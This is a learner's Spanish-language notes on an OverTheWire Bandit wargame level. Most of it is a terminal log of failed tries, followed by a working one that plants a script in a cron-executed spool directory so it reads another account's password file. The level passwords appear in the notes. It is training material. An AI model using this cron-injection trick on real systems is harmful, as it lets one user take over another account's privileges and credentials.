## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso al nivel
bandit23@bandit.labs.overthewire.org -p 2220
contraseña del anterior nivel: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solucion
bandit23@bandit:/$  ls /etc/cron.d/
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:/$ cat /etc/cron.d/cronjob_bandit2
cat: /etc/cron.d/cronjob_bandit2: No such file or directory
bandit23@bandit:/$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/$ mkdir /tmp/rand
bandit23@bandit:/$ cd /tmp/rand
bandit23@bandit:/tmp/rand$ cat /etc/bandit_pass/bandit24 > /tmp/rand/password
cat: /etc/bandit_pass/bandit24: Permission denied
bandit23@bandit:/tmp/rand$ vim script.sh

[2]+  Stopped                 vim script.sh

[2]+  Stopped                 vim script.sh
bandit23@bandit:/tmp/rand$ vim script.sh

[3]+  Stopped                 vim script.sh
bandit23@bandit:/tmp/rand$ touch password
bandit23@bandit:/tmp/rand$
bandit23@bandit:/tmp/rand$
bandit23@bandit:/tmp/rand$ chmod 777 -R /tmp/rand
bandit23@bandit:/tmp/rand$ cp script.sh /var/spool/bandit24
cp: cannot stat 'script.sh': No such file or directory
bandit23@bandit:/tmp/rand$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/rand$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/rand$ chmod 777 scrip.sh
chmod: cannot access 'scrip.sh': No such file or directory
bandit23@bandit:/tmp/rand$ chmod 777 script.sh
bandit23@bandit:/tmp/rand$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/rand$ ls -la
total 420
drwxrwxrwx   2 bandit23 bandit23   4096 Feb 26 02:08 .
drwxrwx-wt 237 root     root     405504 Feb 26 02:09 ..
-rwxrwxrwx   1 bandit23 bandit23      0 Feb 26 01:58 password
-rwxrwxrwx   1 bandit23 bandit23     64 Feb 26 02:07 script.sh
-rwxrwxrwx   1 bandit23 bandit23  12288 Feb 26 01:57 .script.sh.swo
bandit23@bandit:/tmp/rand$ rm .script.sh.swo
bandit23@bandit:/tmp/rand$ rm script.sh
bandit23@bandit:/tmp/rand$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/rand$ ls
password  script.sh
bandit23@bandit:/tmp/rand$ chmod 777 script.sh
bandit23@bandit:/tmp/rand$ ls
password  script.sh
bandit23@bandit:/tmp/rand$ chmod 777 -R /tmp/rand
bandit23@bandit:/tmp/rand$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/rand$ ls -la
total 408
drwxrwxrwx   2 bandit23 bandit23   4096 Feb 26 02:11 .
drwxrwx-wt 239 root     root     405504 Feb 26 02:12 ..
-rwxrwxrwx   1 bandit23 bandit23      0 Feb 26 01:58 password
-rwxrwxrwx   1 bandit23 bandit23     63 Feb 26 02:11 script.sh
bandit23@bandit:/tmp/rand$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/rand$ cat script.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/rand/password
bandit23@bandit:/tmp/rand$ rm script.sh
bandit23@bandit:/tmp/rand$ ls
password
bandit23@bandit:/tmp/rand$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/passtmp/password" > script.sh
bandit23@bandit:/tmp/rand$ ls
password  script.sh
bandit23@bandit:/tmp/rand$ chmod 777 script.sh
bandit23@bandit:/tmp/rand$ ls
password  script.sh
bandit23@bandit:/tmp/rand$ ls -la script.sh
-rwxrwxrwx 1 bandit23 bandit23 55 Feb 26 02:16 script.sh
bandit23@bandit:/tmp/rand$ touch password
bandit23@bandit:/tmp/rand$ ls
password  script.sh
bandit23@bandit:/tmp/rand$ chmod 777 password
bandit23@bandit:/tmp/rand$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/rand/password" > script.sh
bandit23@bandit:/tmp/rand$ ls
password  script.sh
bandit23@bandit:/tmp/rand$ cat script.sh
cat /etc/bandit_pass/bandit24 >> /tmp/rand/password
bandit23@bandit:/tmp/rand$ cp /var/spool/bandit24
cp: missing destination file operand after '/var/spool/bandit24'
Try 'cp --help' for more information.
bandit23@bandit:/tmp/rand$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/rand$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/rand$ cp help
cp: missing destination file operand after 'help'
Try 'cp --help' for more information.
bandit23@bandit:/tmp/rand$ cp --help
Usage: cp [OPTION]... [-T] SOURCE DEST
  or:  cp [OPTION]... SOURCE... DIRECTORY
  or:  cp [OPTION]... -t DIRECTORY SOURCE...
Copy SOURCE to DEST, or multiple SOURCE(s) to DIRECTORY.

Mandatory arguments to long options are mandatory for short options too.
  -a, --archive                same as -dR --preserve=all
      --attributes-only        don't copy the file data, just the attributes
      --backup[=CONTROL]       make a backup of each existing destination file
  -b                           like --backup but does not accept an argument
      --copy-contents          copy contents of special files when recursive
  -d                           same as --no-dereference --preserve=links
  -f, --force                  if an existing destination file cannot be
                                 opened, remove it and try again (this option
                                 is ignored when the -n option is also used)
  -i, --interactive            prompt before overwrite (overrides a previous -n
                                  option)
  -H                           follow command-line symbolic links in SOURCE
  -l, --link                   hard link files instead of copying
  -L, --dereference            always follow symbolic links in SOURCE
  -n, --no-clobber             do not overwrite an existing file (overrides
                                 a previous -i option)
  -P, --no-dereference         never follow symbolic links in SOURCE
  -p                           same as --preserve=mode,ownership,timestamps
      --preserve[=ATTR_LIST]   preserve the specified attributes (default:
                                 mode,ownership,timestamps), if possible
                                 additional attributes: context, links, xattr,
                                 all
      --no-preserve=ATTR_LIST  don't preserve the specified attributes
      --parents                use full source file name under DIRECTORY
  -R, -r, --recursive          copy directories recursively
      --reflink[=WHEN]         control clone/CoW copies. See below
      --remove-destination     remove each existing destination file before
                                 attempting to open it (contrast with --force)
      --sparse=WHEN            control creation of sparse files. See below
      --strip-trailing-slashes  remove any trailing slashes from each SOURCE
                                 argument
  -s, --symbolic-link          make symbolic links instead of copying
  -S, --suffix=SUFFIX          override the usual backup suffix
  -t, --target-directory=DIRECTORY  copy all SOURCE arguments into DIRECTORY
  -T, --no-target-directory    treat DEST as a normal file
  -u, --update                 copy only when the SOURCE file is newer
                                 than the destination file or when the
                                 destination file is missing
  -v, --verbose                explain what is being done
  -x, --one-file-system        stay on this file system
  -Z                           set SELinux security context of destination
                                 file to default type
      --context[=CTX]          like -Z, or if CTX is specified then set the
                                 SELinux or SMACK security context to CTX
      --help     display this help and exit
      --version  output version information and exit

By default, sparse SOURCE files are detected by a crude heuristic and the
corresponding DEST file is made sparse as well.  That is the behavior
selected by --sparse=auto.  Specify --sparse=always to create a sparse DEST
file whenever the SOURCE file contains a long enough sequence of zero bytes.
Use --sparse=never to inhibit creation of sparse files.

When --reflink[=always] is specified, perform a lightweight copy, where the
data blocks are copied only when modified.  If this is not possible the copy
fails, or if --reflink=auto is specified, fall back to a standard copy.
Use --reflink=never to ensure a standard copy is performed.

The backup suffix is '~', unless set with --suffix or SIMPLE_BACKUP_SUFFIX.
The version control method may be selected via the --backup option or through
the VERSION_CONTROL environment variable.  Here are the values:

  none, off       never make backups (even if --backup is given)
  numbered, t     make numbered backups
  existing, nil   numbered if numbered backups exist, simple otherwise
  simple, never   always make simple backups

As a special case, cp makes a backup of SOURCE when the force and backup
options are given and SOURCE and DEST are the same name for an existing,
regular file.

GNU coreutils online help: <https://www.gnu.org/software/coreutils/>
Full documentation <https://www.gnu.org/software/coreutils/cp>
or available locally via: info '(coreutils) cp invocation'
bandit23@bandit:/tmp/rand$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/rand$ cp -b script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/rand$ cp -R script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/rand$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/rand$ chmod 777 -R /tmp/rand
bandit23@bandit:/tmp/rand$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/rand$ sudo cp script.sh /var/spool/bandit24
sudo: /usr/bin/sudo must be owned by uid 0 and have the setuid bit set
bandit23@bandit:/tmp/rand$ ls -la
total 408
drwxrwxrwx   2 bandit23 bandit23   4096 Feb 26 02:16 .
drwxrwx-wt 248 root     root     405504 Feb 26 02:27 ..
-rwxrwxrwx   1 bandit23 bandit23      0 Feb 26 02:17 password
-rwxrwxrwx   1 bandit23 bandit23     52 Feb 26 02:18 script.sh
bandit23@bandit:/tmp/rand$ sudo chown bandit24:bandit24 script.sh
sudo: /usr/bin/sudo must be owned by uid 0 and have the setuid bit set
bandit23@bandit:/tmp/rand$ cp script.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
bandit23@bandit:/tmp/rand$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/rand/password" > /usr/bin/cronjob_bandit24.sh
-bash: /usr/bin/cronjob_bandit24.sh: Operation not permitted
bandit23@bandit:/tmp/rand$


## otra solucion esta si me sirvio
bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ cd /var/spool/foo
-bash: cd: /var/spool/foo: No such file or directory
bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/certa_test.txt" > script.sh
bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 script.sh
chmod: cannot access 'script.sh': No such file or directory
bandit23@bandit:/var/spool/bandit24/foo$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 script.sh
chmod: cannot access 'script.sh': No such file or directory
bandit23@bandit:/var/spool/bandit24/foo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/certa_test.txt" > prueba1.sh
bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 prueba1.sh
bandit23@bandit:/var/spool/bandit24/foo$ ls prueba1.sh
prueba1.sh
bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/certa_test.txt
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
## Notas adicionales 
no pude resolver el ejercicio aun que vi el video de youtube comprendi el hacer un **script.sh** para este ejercicio te lo da todo pero necesitamos permisos de chmod 777
## Referencias 
https://www.youtube.com/watch?v=hbov6s9w7xE
si me funciono este
https://www.youtube.com/watch?v=IzD_ku2EK5M